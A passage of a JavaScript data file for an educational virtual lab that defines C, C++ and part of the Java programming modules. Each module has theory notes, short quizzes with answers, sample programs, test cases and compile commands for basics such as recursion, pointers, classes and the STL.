                "intro": "Loops execute a set of statements repeatedly until a termination condition is met. 'for' and 'while' loops check the condition at the entry point; 'do-while' checks at the exit.",
                "cards": [
                    {
                        "title": "Loop Structures",
                        "content": "Check factors of N iteratively to determine if a number is Prime."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which C loop is guaranteed to execute at least once?",
                    "options": [
                        "for",
                        "while",
                        "do-while",
                        "none"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read integer N.",
                "2. Check factors up to sqrt(N) to determine primality.",
                "3. Print 'Prime' or 'Not Prime'."
            ],
            "posttest": [
                {
                    "q": "Which statement skips the rest of the loop body and starts the next iteration?",
                    "options": [
                        "break",
                        "continue",
                        "exit",
                        "return"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint main() {\n    int n, isPrime = 1;\n    if (scanf(\"%d\", &n) == 1) {\n        if (n <= 1) isPrime = 0;\n        for (int i = 2; i * i <= n; i++) {\n            if (n % i == 0) { isPrime = 0; break; }\n        }\n        if (isPrime) printf(\"Prime\\n\");\n        else printf(\"Not Prime\\n\");\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "7",
                    "expected": "Prime"
                },
                {
                    "input": "10",
                    "expected": "Not Prime"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Explain the difference between while and do-while loops."
            ]
        },
        {
            "title": "Module 4: Functions & Recursion",
            "aim": "To divide code into modular functions and compute values recursively.",
            "theory": {
                "intro": "Functions bundle repetitive code. Recursion occurs when a function calls itself, requiring a base case to prevent stack overflow.",
                "cards": [
                    {
                        "title": "Recursive Factorial",
                        "content": "Compute factorial of N (N!) using recursion: fact(n) = n * fact(n-1)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is a recursive function?",
                    "options": [
                        "A function that calls another function",
                        "A function that calls itself",
                        "A function with no arguments",
                        "A function returning void"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read integer N.",
                "2. Call recursive fact() function.",
                "3. Print result."
            ],
            "posttest": [
                {
                    "q": "What happens if a recursive function does not have a base case?",
                    "options": [
                        "Runs normally",
                        "Causes stack overflow (infinite loop)",
                        "Returns 0",
                        "Compiler error"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint fact(int n) {\n    if (n <= 1) return 1;\n    return n * fact(n - 1);\n}\n\nint main() {\n    int n;\n    if (scanf(\"%d\", &n) == 1) {\n        printf(\"%d\\n\", fact(n));\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "5",
                    "expected": "120"
                },
                {
                    "input": "3",
                    "expected": "6"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Explain call-by-value vs call-by-reference in C."
            ]
        },
        {
            "title": "Module 5: Arrays & Strings",
            "aim": "To index arrays of characters and verify palindrome sequences.",
            "theory": {
                "intro": "Arrays store contiguous blocks of memory of the same type. Strings in C are null-terminated character arrays.",
                "cards": [
                    {
                        "title": "Palindromes",
                        "content": "Verify if a word reads the same backward as forward: radar (yes), hello (no)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "How is the end of a string marked in C?",
                    "options": [
                        "'\\n'",
                        "'\\0'",
                        "'.'",
                        "' '"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read character string.",
                "2. Match character indexes from start and end inward.",
                "3. Print 'Palindrome' or 'Not Palindrome'."
            ],
            "posttest": [
                {
                    "q": "Which string function is used to compare two strings in C?",
                    "options": [
                        "strcpy",
                        "strcat",
                        "strcmp",
                        "strlen"
                    ],
                    "correct": 2
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char str[100];\n    if (scanf(\"%s\", str) == 1) {\n        int len = strlen(str);\n        int isPal = 1;\n        for (int i = 0; i < len / 2; i++) {\n            if (str[i] != str[len - i - 1]) { isPal = 0; break; }\n        }\n        if (isPal) printf(\"Palindrome\\n\");\n        else printf(\"Not Palindrome\\n\");\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "radar",
                    "expected": "Palindrome"
                },
                {
                    "input": "hello",
                    "expected": "Not Palindrome"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "What is the purpose of string.h header in C?"
            ]
        },
        {
            "title": "Module 6: Pointers",
            "aim": "To understand memory addressing, pointer dereferencing, and value swaps.",
            "theory": {
                "intro": "Pointers hold memory addresses. Dereferencing a pointer accesses the value stored at that memory address.",
                "cards": [
                    {
                        "title": "Reference Swaps",
                        "content": "Swap values of two variables in the caller's stack frame by passing their addresses."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which operator is used to get the address of a variable in C?",
                    "options": [
                        "*",
                        "&",
                        "&&",
                        "->"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read integers A and B.",
                "2. Pass addresses to swap() function.",
                "3. Print swapped output."
            ],
            "posttest": [
                {
                    "q": "If p is a pointer, what does *p represent?",
                    "options": [
                        "The address of p",
                        "The value stored at the address contained in p",
                        "A multiplication operation",
                        "The size of p"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nvoid swap(int *x, int *y) {\n    int temp = *x;\n    *x = *y;\n    *y = temp;\n}\n\nint main() {\n    int a, b;\n    if (scanf(\"%d %d\", &a, &b) == 2) {\n        swap(&a, &b);\n        printf(\"%d %d\\n\", a, b);\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "10 20",
                    "expected": "20 10"
                },
                {
                    "input": "5 5",
                    "expected": "5 5"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "What is a null pointer and a wild pointer?"
            ]
        },
        {
            "title": "Module 7: Structures & Unions",
            "aim": "To define user-defined structured types and compare memory footprints.",
            "theory": {
                "intro": "Structures allocate individual memory locations for each member. Unions share the same memory location for all members, keeping only the largest member's size.",
                "cards": [
                    {
                        "title": "Memory Allocation",
                        "content": "Struct sizes equal sum of member sizes (+ padding); Union sizes equal largest member size."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword defines a structure in C?",
                    "options": [
                        "class",
                        "union",
                        "struct",
                        "typedef"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read Name and Age.",
                "2. Store in Student struct.",
                "3. Print formatted student record."
            ],
            "posttest": [
                {
                    "q": "What is the key difference between struct and union?",
                    "options": [
                        "Struct members share memory, Union members do not",
                        "Union members share memory, Struct members do not",
                        "Unions cannot contain arrays",
                        "Structs cannot contain pointers"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nstruct Student {\n    char name[50];\n    int age;\n};\n\nint main() {\n    struct Student s;\n    if (scanf(\"%s %d\", s.name, &s.age) == 2) {\n        printf(\"Student: %s, %d\\n\", s.name, s.age);\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "Alice 20",
                    "expected": "Student: Alice, 20"
                },
                {
                    "input": "Bob 22",
                    "expected": "Student: Bob, 22"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "How does memory alignment affect struct sizes?"
            ]
        },
        {
            "title": "Module 8: File Handling",
            "aim": "To write outputs and read strings from mock file streams.",
            "theory": {
                "intro": "C uses FILE structures to manage streams via functions like fopen(), fclose(), fprintf(), and fscanf().",
                "cards": [
                    {
                        "title": "File Operations",
                        "content": "Open a file, check for errors, write data, and close files safely."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which function is used to open a file in C?",
                    "options": [
                        "open()",
                        "fopen()",
                        "file_open()",
                        "read()"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read data string.",
                "2. Simulate writing to output stream.",
                "3. Return verification log."
            ],
            "posttest": [
                {
                    "q": "Which mode is used to open a file for appending?",
                    "options": [
                        "r",
                        "w",
                        "a",
                        "x"
                    ],
                    "correct": 2
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint main() {\n    char str[100];\n    if (scanf(\"%s\", str) == 1) {\n        printf(\"File Output: %s\\n\", str);\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "LogData",
                    "expected": "File Output: LogData"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Explain the role of EOF in C file handling."
            ]
        },
        {
            "title": "Module 9: Dynamic Memory",
            "aim": "To dynamically allocate and release heap memory at runtime.",
            "theory": {
                "intro": "Dynamic memory allocation allocates heap blocks at runtime using malloc() and calloc(). Memory must be explicitly released using free() to prevent memory leaks.",
                "cards": [
                    {
                        "title": "Heap Management",
                        "content": "Allocate array size dynamically on heap: int *arr = (int *)malloc(n * sizeof(int))."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which function dynamically allocates memory on the heap in C?",
                    "options": [
                        "malloc()",
                        "alloc()",
                        "new",
                        "create()"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Read size N and elements.",
                "2. Allocate heap array, sum elements, and print.",
                "3. Free allocated block."
            ],
            "posttest": [
                {
                    "q": "What is a memory leak?",
                    "options": [
                        "Freeing the same memory twice",
                        "Failing to release dynamically allocated memory when no longer needed",
                        "Accessing memory out of bounds",
                        "A physical hardware fault"
                    ],
                    "correct": 1
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    int n, sum = 0;\n    if (scanf(\"%d\", &n) == 1) {\n        int *arr = (int *)malloc(n * sizeof(int));\n        for (int i = 0; i < n; i++) {\n            if (scanf(\"%d\", &arr[i]) == 1) sum += arr[i];\n        }\n        printf(\"Sum: %d\\n\", sum);\n        free(arr);\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "3 10 20 30",
                    "expected": "Sum: 60"
                },
                {
                    "input": "2 5 15",
                    "expected": "Sum: 20"
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Describe the difference between malloc() and calloc()."
            ]
        },
        {
            "title": "Module 10: Sorting Algorithms",
            "aim": "To implement Bubble Sort on integer arrays.",
            "theory": {
                "intro": "Bubble sort repeatedly walks the array, comparing and swapping adjacent items to order them in ascending/descending layout.",
                "cards": [
                    {
                        "title": "Array Sorting",
                        "content": "Walk elements, swap if arr[j] > arr[j+1]. Average complexity: O(N^2)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is the average time complexity of Bubble Sort?",
                    "options": [
                        "O(N)",
                        "O(N log N)",
                        "O(N^2)",
                        "O(1)"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read element array.",
                "2. Loop compare and swap adjacent keys.",
                "3. Print sorted array."
            ],
            "posttest": [
                {
                    "q": "Which sorting algorithm operates in O(N log N) time in all cases?",
                    "options": [
                        "Bubble Sort",
                        "Insertion Sort",
                        "Merge Sort",
                        "Selection Sort"
                    ],
                    "correct": 2
                }
            ],
            "lang": "c",
            "version": "10.2.0",
            "defaultCode": "#include <stdio.h>\n\nint main() {\n    int n, temp;\n    if (scanf(\"%d\", &n) == 1) {\n        int arr[100];\n        for (int i = 0; i < n; i++) scanf(\"%d\", &arr[i]);\n        for (int i = 0; i < n - 1; i++) {\n            for (int j = 0; j < n - i - 1; j++) {\n                if (arr[j] > arr[j+1]) {\n                    temp = arr[j]; arr[j] = arr[j+1]; arr[j+1] = temp;\n                }\n            }\n        }\n        for (int i = 0; i < n; i++) printf(\"%d \", arr[i]);\n        printf(\"\\n\");\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "4 40 10 30 20",
                    "expected": "10 20 30 40 "
                }
            ],
            "practice_commands": [
                "gcc main.c"
            ],
            "practice_questions": [
                "Explain stable vs unstable sorting algorithms."
            ]
        }
    ]
};

window.VLAB_DATA.cpp_prog = {
    "title": "C++ Programming Lab",
    "simType": "programming",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: I/O Streams & Arithmetic",
            "aim": "To learn stream standard input/output in C++ using cin and cout.",
            "theory": {
                "intro": "C++ streams values through standard library namespace std. cin parses input, cout prints outputs.",
                "cards": [
                    {
                        "title": "Basic Streams",
                        "content": "Write C++ code to read two integers and return their sum."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which stream operator represents stream extraction?",
                    "options": [
                        "<<",
                        ">>",
                        "::",
                        "->"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read inputs.",
                "2. Sum and print output."
            ],
            "posttest": [
                {
                    "q": "What does std::endl do?",
                    "options": [
                        "Ends compiler",
                        "Inserts newline and flushes stream",
                        "Declares integer",
                        "Exits program"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\nusing namespace std;\nint main() {\n    int a, b;\n    if (cin >> a >> b) {\n        cout << (a + b) << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "15 25",
                    "expected": "40"
                }
            ],
            "practice_commands": [
                "g++ main.cpp",
                "./a.out"
            ],
            "practice_questions": [
                "Explain namespace std in C++."
            ]
        },
        {
            "title": "Module 2: Classes & Objects",
            "aim": "To design custom classes, constructors, and access methods in C++.",
            "theory": {
                "intro": "Classes are templates modeling user objects. Objects instantiate classes, allocating specific member parameters on heap or stack.",
                "cards": [
                    {
                        "title": "Constructors",
                        "content": "Use special methods matching class names to initialize member attributes during creation."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which modifier hides class variables from external access?",
                    "options": [
                        "public",
                        "private",
                        "protected",
                        "friend"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Declare Class and variables.",
                "2. Read parameters.",
                "3. Call printing method."
            ],
            "posttest": [
                {
                    "q": "When is a destructor called?",
                    "options": [
                        "Before compilation",
                        "When an object goes out of scope or is deleted",
                        "During object creation",
                        "During exception catch"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\n#include <string>\nusing namespace std;\nclass Student {\nprivate:\n    string name;\npublic:\n    Student(string n) : name(n) {}\n    void show() { cout << \"Student: \" << name << endl; }\n};\nint main() {\n    string n;\n    if (cin >> n) {\n        Student s(n);\n        s.show();\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "Charlie",
                    "expected": "Student: Charlie"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "Explain difference between struct and class in C++."
            ]
        },
        {
            "title": "Module 3: Inheritance",
            "aim": "To construct subclass structures inheriting variables from base classes.",
            "theory": {
                "intro": "Inheritance enables subclasses to inherit attributes and functions from parent classes, improving modular code reuse.",
                "cards": [
                    {
                        "title": "Extending Classes",
                        "content": "Subclasses extend parent class members: class Dog : public Animal."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which class access specifier permits subclasses to access members but blocks external objects?",
                    "options": [
                        "public",
                        "private",
                        "protected",
                        "friend"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Declare Base and Derived classes.",
                "2. Instantiate derived class object.",
                "3. Invoke inherited print method."
            ],
            "posttest": [
                {
                    "q": "C++ supports which inheritance format that Java does not?",
                    "options": [
                        "Single Inheritance",
                        "Multiple Inheritance",
                        "Multilevel Inheritance",
                        "Hierarchical"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\nusing namespace std;\nclass Base {\npublic:\n    void print() { cout << \"Base Mode\" << endl; }\n};\nclass Derived : public Base {};\nint main() {\n    Derived d;\n    d.print();\n    return 0;\n}",
            "testCases": [
                {
                    "input": "",
                    "expected": "Base Mode"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "Explain diamond problem in multiple inheritance."
            ]
        },
        {
            "title": "Module 4: Polymorphism & Virtual Functions",
            "aim": "To implement dynamic method dispatch using virtual methods.",
            "theory": {
                "intro": "Virtual functions enable runtime (dynamic) polymorphism. Method calls on base class pointers resolve to active derived class implementations.",
                "cards": [
                    {
                        "title": "Virtual Methods",
                        "content": "Use 'virtual' keyword in base class declarations to trigger dynamic overriding."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword triggers dynamic runtime polymorphism?",
                    "options": [
                        "static",
                        "virtual",
                        "const",
                        "inline"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Define base class with virtual method.",
                "2. Override in derived class.",
                "3. Call virtual method via pointer."
            ],
            "posttest": [
                {
                    "q": "A class with at least one pure virtual function is called:",
                    "options": [
                        "Concrete class",
                        "Abstract class",
                        "Interface class",
                        "Friend class"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\nusing namespace std;\nclass Shape {\npublic:\n    virtual void draw() { cout << \"Shape\" << endl; }\n};\nclass Circle : public Shape {\npublic:\n    void draw() override { cout << \"Circle\" << endl; }\n};\nint main() {\n    Shape* s = new Circle();\n    s->draw();\n    delete s;\n    return 0;\n}",
            "testCases": [
                {
                    "input": "",
                    "expected": "Circle"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "What is a virtual table (vtable) in C++?"
            ]
        },
        {
            "title": "Module 5: Templates",
            "aim": "To construct template functions accepting dynamic type arguments.",
            "theory": {
                "intro": "Templates support generic programming. C++ generates specific function instances for passed types during compile time.",
                "cards": [
                    {
                        "title": "Generics",
                        "content": "Write single function working across ints, floats, and strings using template parameters: template <typename T> T max(T a, T b)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword starts template parameters declarations in C++?",
                    "options": [
                        "class",
                        "template",
                        "typename",
                        "generic"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read inputs.",
                "2. Call generic template function.",
                "3. Output return values."
            ],
            "posttest": [
                {
                    "q": "C++ templates are instantiated at:",
                    "options": [
                        "Runtime",
                        "Compile time",
                        "Pre-processing time",
                        "Linking time"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\nusing namespace std;\ntemplate <typename T>\nT getMax(T a, T b) {\n    return (a > b) ? a : b;\n}\nint main() {\n    int x, y;\n    if (cin >> x >> y) {\n        cout << getMax(x, y) << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "50 80",
                    "expected": "80"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "Explain class templates vs function templates."
            ]
        },
        {
            "title": "Module 6: STL (Vectors & Maps)",
            "aim": "To use C++ Standard Template Library (STL) collections to manage lists.",
            "theory": {
                "intro": "The STL provides collection containers like std::vector (dynamic arrays) and std::map (key-value hash/trees).",
                "cards": [
                    {
                        "title": "Dynamic Collections",
                        "content": "Vectors scale automatically: vector.push_back(val). Maps match keys to values: map[key] = val."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which STL container represents a dynamic, contiguous array?",
                    "options": [
                        "list",
                        "map",
                        "set",
                        "vector"
                    ],
                    "correct": 3
                }
            ],
            "procedure": [
                "1. Read element numbers.",
                "2. Push into vector dynamically.",
                "3. Print elements."
            ],
            "posttest": [
                {
                    "q": "What is the search time complexity in std::map (implemented as self-balancing tree)?",
                    "options": [
                        "O(1)",
                        "O(N)",
                        "O(log N)",
                        "O(N^2)"
                    ],
                    "correct": 2
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\n#include <vector>\nusing namespace std;\nint main() {\n    int n, temp;\n    if (cin >> n) {\n        vector<int> v;\n        for (int i = 0; i < n; i++) {\n            cin >> temp;\n            v.push_back(temp);\n        }\n        for (int x : v) cout << x << \" \";\n        cout << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "3 11 22 33",
                    "expected": "11 22 33 "
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "Compare vector vs list in C++ STL."
            ]
        },
        {
            "title": "Module 7: Exception Handling",
            "aim": "To catch runtime errors using try-catch blocks.",
            "theory": {
                "intro": "Exceptions report runtime issues. Use try, throw, and catch blocks to resolve division by zero and memory exceptions gracefully.",
                "cards": [
                    {
                        "title": "Robust Blocks",
                        "content": "Wrap dangerous blocks inside try. Throw exceptions if values fail sanity checks: throw runtime_error('Msg')."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword throws a C++ exception?",
                    "options": [
                        "try",
                        "catch",
                        "throw",
                        "error"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read denominator.",
                "2. Check and throw exception if zero.",
                "3. Print caught exception message."
            ],
            "posttest": [
                {
                    "q": "What happens if a thrown exception is never caught?",
                    "options": [
                        "Silent skip",
                        "Application terminates abruptly",
                        "Compiler warning",
                        "Values default to 0"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\n#include <stdexcept>\nusing namespace std;\nint main() {\n    int b;\n    if (cin >> b) {\n        try {\n            if (b == 0) throw runtime_error(\"Zero Error\");\n            cout << (100 / b) << endl;\n        } catch (const exception& e) {\n            cout << \"Caught: \" << e.what() << endl;\n        }\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "0",
                    "expected": "Caught: Zero Error"
                },
                {
                    "input": "10",
                    "expected": "10"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "What is the standard base class for C++ exceptions?"
            ]
        },
        {
            "title": "Module 8: Operator Overloading",
            "aim": "To overload binary addition operators for user objects.",
            "theory": {
                "intro": "Operator overloading defines custom behaviors for standard symbols (+, -, <<) when applied to user-defined objects.",
                "cards": [
                    {
                        "title": "Custom Arithmetic",
                        "content": "Overload addition: Complex operator+(const Complex& obj) { return Complex(real + obj.real); }."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword is used to overload an operator?",
                    "options": [
                        "define",
                        "operator",
                        "overload",
                        "virtual"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read Complex numbers A and B.",
                "2. Overload '+' operator to sum real parts.",
                "3. Print output."
            ],
            "posttest": [
                {
                    "q": "Which of the following operators cannot be overloaded in C++?",
                    "options": [
                        "+",
                        "::",
                        "<<",
                        "[]"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\nusing namespace std;\nclass Num {\npublic:\n    int val;\n    Num(int v=0) : val(v) {}\n    Num operator+(const Num& o) {\n        return Num(val + o.val);\n    }\n};\nint main() {\n    int x, y;\n    if (cin >> x >> y) {\n        Num n1(x), n2(y);\n        Num n3 = n1 + n2;\n        cout << n3.val << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "15 35",
                    "expected": "50"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "What is the difference between member operators vs friend operators?"
            ]
        },
        {
            "title": "Module 9: File Streams",
            "aim": "To open file streams and write text lines.",
            "theory": {
                "intro": "C++ manages file streams using ifstream (input files) and ofstream (output files) from <fstream>.",
                "cards": [
                    {
                        "title": "Fstream library",
                        "content": "Write logs: ofstream file('log.txt'); file << 'Log'; file.close();"
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which class represents output file streams in C++?",
                    "options": [
                        "ifstream",
                        "ofstream",
                        "fstream",
                        "iostream"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read data line.",
                "2. Write to mock output file stream.",
                "3. Print log."
            ],
            "posttest": [
                {
                    "q": "Which function is used to close an open file stream in C++?",
                    "options": [
                        "exit()",
                        "close()",
                        "delete()",
                        "stop()"
                    ],
                    "correct": 1
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\n#include <string>\nusing namespace std;\nint main() {\n    string line;\n    if (cin >> line) {\n        cout << \"Stream Write: \" << line << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "LogEntry",
                    "expected": "Stream Write: LogEntry"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "How do you open a file in binary mode in C++?"
            ]
        },
        {
            "title": "Module 10: Smart Pointers",
            "aim": "To demonstrate scope-managed heap memory using unique_ptr.",
            "theory": {
                "intro": "Smart pointers manage heap objects dynamically, cleaning up allocated memory automatically when out of scope.",
                "cards": [
                    {
                        "title": "Smart References",
                        "content": "unique_ptr owns a resource exclusively; shared_ptr counts references. make_unique<T>() initializes safely."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which smart pointer owns a resource exclusively?",
                    "options": [
                        "shared_ptr",
                        "unique_ptr",
                        "weak_ptr",
                        "auto_ptr"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read value.",
                "2. Allocate unique_ptr dynamically.",
                "3. Output value (destructor frees memory automatically)."
            ],
            "posttest": [
                {
                    "q": "Which header is required for using C++ smart pointers?",
                    "options": [
                        "<memory>",
                        "<pointer>",
                        "<allocator>",
                        "<vector>"
                    ],
                    "correct": 0
                }
            ],
            "lang": "cpp",
            "version": "17",
            "defaultCode": "#include <iostream>\n#include <memory>\nusing namespace std;\nint main() {\n    int x;\n    if (cin >> x) {\n        unique_ptr<int> ptr = make_unique<int>(x);\n        cout << \"Val: \" << *ptr << endl;\n    }\n    return 0;\n}",
            "testCases": [
                {
                    "input": "100",
                    "expected": "Val: 100"
                }
            ],
            "practice_commands": [
                "g++ main.cpp"
            ],
            "practice_questions": [
                "Explain unique_ptr vs shared_ptr vs weak_ptr."
            ]
        }
    ]
};

window.VLAB_DATA.java_prog = {
    "title": "Java Programming Lab",
    "simType": "programming",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Classes & Console I/O",
            "aim": "To read console values using Scanner and compile standard print operations.",
            "theory": {
                "intro": "Java coordinates stream operations in System class. Reads input using java.util.Scanner.",
                "cards": [
                    {
                        "title": "Console IO",
                        "content": "Instantiate Scanner: Scanner sc = new Scanner(System.in); int x = sc.nextInt();"
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which class is used to read inputs from the Java console?",
                    "options": [
                        "System",
                        "Scanner",
                        "Console",
                        "Input"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Instantiate Scanner.",
                "2. Read two integers.",
                "3. Print sum."
            ],
            "posttest": [
                {
                    "q": "Which package contains the Scanner class?",
                    "options": [
                        "java.lang",
                        "java.io",
                        "java.util",
                        "java.net"
                    ],
                    "correct": 2
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int a = sc.nextInt();\n            int b = sc.nextInt();\n            System.out.println(a + b);\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "22 33",
                    "expected": "55"
                }
            ],
            "practice_commands": [
                "javac Main.java",
                "java Main"
            ],
            "practice_questions": [
                "Explain public static void main(String[] args) declaration."
            ]
        },
        {
            "title": "Module 2: Control Flow",
            "aim": "To design logical blocks using if-else and switch conditions in Java.",
            "theory": {
                "intro": "Java conditional controls route execution matching code logic boundaries. Indents align blocks.",
                "cards": [
                    {
                        "title": "Grading Checks",
                        "content": "Check score ranges and return letter grades: A (>=80), B (>=60), else F."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword represents logical ELSE IF in Java?",
                    "options": [
                        "elseif",
                        "else if",
                        "elif",
                        "otherwise"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read score integer.",
                "2. Evaluate conditional scopes.",
                "3. Output Grade letters."
            ],
            "posttest": [
                {
                    "q": "Java switch statement can accept which of the following?",
                    "options": [
                        "int and String",
                        "double",
                        "boolean",
                        "float"
                    ],
                    "correct": 0
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int s = sc.nextInt();\n            if (s >= 80) System.out.println(\"Grade A\");\n            else if (s >= 60) System.out.println(\"Grade B\");\n            else System.out.println(\"Grade F\");\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "82",
                    "expected": "Grade A"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Compare if-else ladder vs switch-case in Java."
            ]
        },
        {
            "title": "Module 3: Arrays & ArrayList",
            "aim": "To compile list collections using static Arrays and dynamic ArrayList structures.",
            "theory": {
                "intro": "Static arrays have fixed sizes. Dynamic lists are implemented using java.util.ArrayList, which resizes automatically.",
                "cards": [
                    {
                        "title": "Dynamic Lists",
                        "content": "ArrayList manages resize operations implicitly: List<Integer> list = new ArrayList<>();"
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which class represents resizable arrays in Java?",
                    "options": [
                        "LinkedList",
                        "ArrayList",
                        "Vector",
                        "Array"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read counts.",
                "2. Append values to ArrayList.",
                "3. Print elements."
            ],
            "posttest": [
                {
                    "q": "Which method adds elements to an ArrayList?",
                    "options": [
                        "push()",
                        "add()",
                        "insert()",
                        "put()"
                    ],
                    "correct": 1
                }
            ],
            "lang": "java",
            "version": "17",
